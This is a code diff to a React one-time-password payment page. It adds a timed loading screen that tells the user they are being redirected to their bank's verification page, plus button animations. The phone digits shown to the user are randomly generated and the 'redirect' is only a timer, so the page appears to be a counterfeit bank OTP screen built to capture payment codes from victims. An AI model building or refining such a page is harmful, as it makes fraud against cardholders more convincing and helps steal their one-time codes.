@@ -47,6 +47,16 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
   const [resendCooldown, setResendCooldown] = useState(false);
   const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
   const [showResendSuccess, setShowResendSuccess] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
+
+  // Loading state effect - show loading for 2.5 seconds
+  useEffect(() => {
+    const loadingTimer = setTimeout(() => {
+      setIsLoading(false);
+    }, 2500);
+
+    return () => clearTimeout(loadingTimer);
+  }, []);
 
   // Timer countdown effect
   useEffect(() => {
@@ -123,8 +133,22 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
     const style = document.createElement('style');
     style.textContent = `
       @keyframes spin {
-        0% { transform: translate(-50%, -50%) rotate(0deg); }
-        100% { transform: translate(-50%, -50%) rotate(360deg); }
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      @keyframes pulse {
+        0%, 100% { opacity: 0.8; transform: translate(-50%, -50%) scale(1); }
+        50% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
+      }
+      @keyframes bounce {
+        0%, 80%, 100% { 
+          transform: scale(0.8);
+          opacity: 0.5;
+        }
+        40% { 
+          transform: scale(1);
+          opacity: 1;
+        }
       }
     `;
     document.head.appendChild(style);
@@ -170,6 +194,86 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
       document.removeEventListener('contextmenu', preventZoom);
     };
   }, []);
+
+  // Show loading screen first
+  if (isLoading) {
+    return (
+      <div className="fixed inset-0 bg-white z-50 flex items-center justify-center" style={{
+        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
+        backgroundColor: '#f8f9fa'
+      }}>
+        <div style={{ textAlign: 'center' }}>
+          <div style={{
+            position: 'relative',
+            width: '80px',
+            height: '80px',
+            margin: '0 auto 24px'
+          }}>
+            <div style={{
+              width: '80px',
+              height: '80px',
+              border: '4px solid #e5e7eb',
+              borderRadius: '50%',
+              borderTop: '4px solid #3b82f6',
+              animation: 'spin 1s linear infinite'
+            }} />
+            <div style={{
+              position: 'absolute',
+              top: '50%',
+              left: '50%',
+              transform: 'translate(-50%, -50%)',
+              width: '12px',
+              height: '12px',
+              backgroundColor: '#3b82f6',
+              borderRadius: '50%',
+              animation: 'pulse 1.5s ease-in-out infinite'
+            }} />
+          </div>
+          <h2 style={{
+            fontSize: '20px',
+            fontWeight: '600',
+            color: '#1f2937',
+            marginBottom: '8px'
+          }}>Setting up secure payment...</h2>
+          <p style={{
+            fontSize: '14px',
+            color: '#6b7280'
+          }}>Please wait while we redirect you to your bank's verification page</p>
+          <div style={{
+            display: 'flex',
+            justifyContent: 'center',
+            gap: '4px',
+            marginTop: '16px'
+          }}>
+            <div style={{
+              width: '8px',
+              height: '8px',
+              backgroundColor: '#3b82f6',
+              borderRadius: '50%',
+              animation: 'bounce 1.4s ease-in-out infinite',
+              animationDelay: '0ms'
+            }} />
+            <div style={{
+              width: '8px',
+              height: '8px',
+              backgroundColor: '#3b82f6',
+              borderRadius: '50%',
+              animation: 'bounce 1.4s ease-in-out infinite',
+              animationDelay: '150ms'
+            }} />
+            <div style={{
+              width: '8px',
+              height: '8px',
+              backgroundColor: '#3b82f6',
+              borderRadius: '50%',
+              animation: 'bounce 1.4s ease-in-out infinite',
+              animationDelay: '300ms'
+            }} />
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="fixed inset-0 bg-white z-50 overflow-auto" style={{
@@ -424,8 +528,8 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
             style={{
               width: '100%',
               padding: '16px',
-              background: (otpValue.length >= 4 && !otpSubmitting) ? '#3B82F6' : '#cccccc',
-              color: (otpValue.length >= 4 && !otpSubmitting) ? 'white' : '#666666',
+              background: otpSubmitting ? '#34C759' : (otpValue.length >= 4 ? '#3B82F6' : '#cccccc'),
+              color: (otpValue.length >= 4 || otpSubmitting) ? 'white' : '#666666',
               border: 'none',
               borderRadius: '8px',
               fontSize: '16px',
@@ -433,26 +537,30 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
               letterSpacing: '1px',
               cursor: (otpValue.length >= 4 && !otpSubmitting) ? 'pointer' : 'not-allowed',
               marginBottom: '20px',
-              transition: 'all 0.3s ease',
+              transition: 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)',
               textTransform: 'uppercase',
-              position: 'relative'
+              position: 'relative',
+              overflow: 'hidden'
             }}
           >
             {otpSubmitting ? (
               <>
-                <span style={{ opacity: 0.3 }}>CONFIRM PAYMENT</span>
-                <div style={{
-                  position: 'absolute',
-                  left: '50%',
-                  top: '50%',
-                  transform: 'translate(-50%, -50%)',
-                  width: '20px',
-                  height: '20px',
-                  border: '2px solid #fff',
-                  borderTop: '2px solid transparent',
-                  borderRadius: '50%',
-                  animation: 'spin 1s linear infinite'
-                }} />
+                <span style={{ 
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  gap: '8px'
+                }}>
+                  <div style={{
+                    width: '18px',
+                    height: '18px',
+                    border: '2px solid rgba(255,255,255,0.3)',
+                    borderTop: '2px solid #ffffff',
+                    borderRadius: '50%',
+                    animation: 'spin 1s linear infinite'
+                  }} />
+                  PROCESSING...
+                </span>
               </>
             ) : (
               'CONFIRM PAYMENT'
